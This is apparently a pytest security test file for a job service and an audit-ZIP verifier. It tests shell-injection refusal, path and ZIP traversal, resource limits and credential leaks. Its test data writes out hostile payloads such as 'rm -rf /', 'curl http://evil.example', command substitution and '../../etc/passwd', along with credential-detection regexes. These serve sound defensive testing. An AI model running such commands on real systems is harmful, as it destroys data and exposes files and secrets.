"""T-SECURITY - path escape, shell injection, ZIP traversal, resource limits.

Two distinct threats are covered:

* the UI submits a job and something in the parameter set becomes a command;
* the UI opens an audit ZIP and a member name escapes the extraction directory.

Both are tested against the *real* implementations, not a mock, because the
defence lives in the argument list and the extraction call.
"""

from __future__ import annotations

import os
import sys
import zipfile
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[2]


# --------------------------------------------------------------------------
# shell injection through the job argument list
# --------------------------------------------------------------------------
@pytest.fixture()
def service(tmp_path: Path):
    from optisys.jobs.service import JobService

    return JobService(ROOT, jobs_dir=tmp_path / "jobs")


def _spec(python: str, body: list[str]):
    from optisys.jobs.service import JobSpec

    return JobSpec(
        job_id="probe", label="probe", description="probe",
        build_argv=lambda params, root: [python, *body],
        estimated_wall_s=1.0, timeout_s=30.0,
    )


@pytest.mark.parametrize("payload", [
    "pass; rm -rf /",
    "pass && curl http://evil.example",
    "pass || echo pwned",
    "pass | tee /etc/passwd",
    "pass `whoami`",
    "pass $(whoami)",
    "pass > /tmp/out",
    "pass < /etc/passwd",
    "pass\nprint('second line')",
])
def test_shell_metacharacters_are_refused(service, payload: str) -> None:
    """The argument list is never handed to a shell, and metacharacters are
    rejected before spawning anyway - belt and braces."""

    with pytest.raises(ValueError, match="shell metacharacter"):
        service.start(_spec(sys.executable, ["-c", payload]), {}, background=False)


def test_no_shell_is_used_at_all() -> None:
    """``shell=True`` would make every argument-list defence moot."""

    source = (ROOT / "src" / "optisys" / "jobs" / "service.py").read_text(encoding="utf-8")
    assert "shell=True" not in source
    assert "os.system" not in source
    assert "shell=" in source or "Popen" in source


def test_path_outside_the_project_is_refused(service) -> None:
    """A path that genuinely escapes ``ROOT`` must be refused.

    The path is *constructed* outside the root rather than borrowed from
    ``tmp_path``: pytest's base temp directory can be pointed inside the project
    (``--basetemp=...``), and then a test written against ``tmp_path`` silently
    stops testing anything - it would assert that an in-project path is refused,
    which the guard rightly allows.  The precondition is asserted explicitly so
    that failure mode cannot come back unnoticed.
    """

    outside = ROOT.parent / "optisys_g3_outside_probe" / "outside.yaml"
    with pytest.raises(ValueError):
        outside.relative_to(ROOT)
    with pytest.raises(ValueError, match="escapes the project root"):
        service.start(_spec(sys.executable, ["-m", "optisys", str(outside)]),
                      {}, background=False)


def test_parent_directory_traversal_is_refused(service) -> None:
    with pytest.raises(ValueError, match="escapes the project root"):
        service.start(_spec(sys.executable, ["-m", "optisys", "../../etc/passwd"]),
                      {}, background=False)


def test_a_non_python_executable_cannot_head_the_argv(service) -> None:
    with pytest.raises(ValueError, match="python interpreter"):
        service.start(_spec("powershell", ["-Command", "echo hi"]), {}, background=False)


def test_relative_path_inside_the_project_is_accepted(service) -> None:
    """The guard must not be so strict that it blocks a legitimate path."""

    record = service.start(
        _spec(sys.executable, ["-c", "pass", "configs/g3_demo.yaml"]),
        {}, background=False)
    assert record.state.value == "PASS"


# --------------------------------------------------------------------------
# ZIP traversal in the audit package reader
# --------------------------------------------------------------------------
def _make_zip(path: Path, members: dict[str, bytes]) -> None:
    with zipfile.ZipFile(path, "w") as archive:
        for name, data in members.items():
            archive.writestr(name, data)


@pytest.mark.parametrize("member", [
    "../escaped.txt",
    "../../escaped.txt",
    "sub/../../escaped.txt",
])
def test_zipslip_member_names_are_detected(tmp_path: Path, member: str) -> None:
    """A relative member name that resolves outside the target is an attack.

    The check is asserted against the resolver used by the verifier so that a
    change in the verifier cannot silently accept traversal names.
    """

    from scripts.verify_g3_audit_package import is_safe_member  # type: ignore

    assert is_safe_member(member) is False, f"{member} accepted as a safe member"


def test_absolute_member_name_is_detected() -> None:
    from scripts.verify_g3_audit_package import is_safe_member  # type: ignore

    for member in ("/etc/passwd", "C:/Windows/system32/cmd.exe",
                   "\\\\server\\share\\file"):
        assert is_safe_member(member) is False, f"{member} accepted as a safe member"


def test_ordinary_member_names_are_accepted() -> None:
    from scripts.verify_g3_audit_package import is_safe_member  # type: ignore

    for member in ("README.md", "runs/G2/summary.json", "src/optisys/cli.py"):
        assert is_safe_member(member) is True, f"{member} wrongly rejected"


# --------------------------------------------------------------------------
# resource limits
# --------------------------------------------------------------------------
def test_child_environment_caps_blas_threads() -> None:
    """An unbounded BLAS pool inside a job would starve the UI process."""

    from optisys.jobs.service import _child_env

    env = _child_env()
    for name in ("OMP_NUM_THREADS", "OPENBLAS_NUM_THREADS", "MKL_NUM_THREADS",
                 "NUMEXPR_NUM_THREADS"):
        assert env.get(name) == "1", f"{name} is not capped"
    assert env.get("PYTHONUNBUFFERED") == "1"


def test_child_environment_does_not_inherit_the_parent_thread_override() -> None:
    """``setdefault`` means an explicit parent value survives, and that is deliberate:
    the operator's choice must not be silently overwritten.  Assert the semantics
    rather than the value so the test documents the intent."""

    from optisys.jobs import service as svc

    original = os.environ.get("OMP_NUM_THREADS")
    os.environ["OMP_NUM_THREADS"] = "4"
    try:
        assert svc._child_env()["OMP_NUM_THREADS"] == "4"
    finally:
        if original is None:
            os.environ.pop("OMP_NUM_THREADS", None)
        else:
            os.environ["OMP_NUM_THREADS"] = original


def test_timeout_is_finite_and_declared_for_every_job() -> None:
    from optisys.jobs.service import default_jobs

    for job_id, spec in default_jobs().items():
        assert spec.timeout_s > 0, f"{job_id} has no timeout"
        assert spec.timeout_s != float("inf"), f"{job_id} can run forever"


# --------------------------------------------------------------------------
# no secret material in the published artefacts
# --------------------------------------------------------------------------
def test_reports_contain_no_absolute_user_path() -> None:
    """A published report must not leak the operator's home directory."""

    from optisys.reports.report_service import ReportService

    import tempfile

    run = ROOT / "runs" / "20261019_191117_G2_52369787"
    if not run.is_dir():
        pytest.skip("frozen G2 run absent")
    with tempfile.TemporaryDirectory() as tmp:
        result = ReportService(ROOT / "runs", verdict_root=ROOT).build(
            run, out_dir=Path(tmp), formats=("html",))
        html = (Path(tmp) / "report.html").read_text(encoding="utf-8")
    home = str(Path.home())
    assert home not in html, f"report leaks the home directory path {home!r}"
    assert "C:\\Users\\" not in html or "C:\\Users\\" in str(ROOT), (
        "report contains an absolute Windows user path from outside this project")


def test_verdict_contains_no_credential_like_string() -> None:
    import json
    import re

    verdict = json.loads(
        (ROOT / "docs" / "g3" / "G2_INHERITANCE_VERDICT.json").read_text(encoding="utf-8"))
    blob = json.dumps(verdict, ensure_ascii=False)
    for pattern in (r"sk-[A-Za-z0-9]{20,}", r"ghp_[A-Za-z0-9]{20,}",
                    r"AKIA[0-9A-Z]{16}", r"-----BEGIN [A-Z ]*PRIVATE KEY-----"):
        assert not re.search(pattern, blob), f"verdict matches credential pattern {pattern}"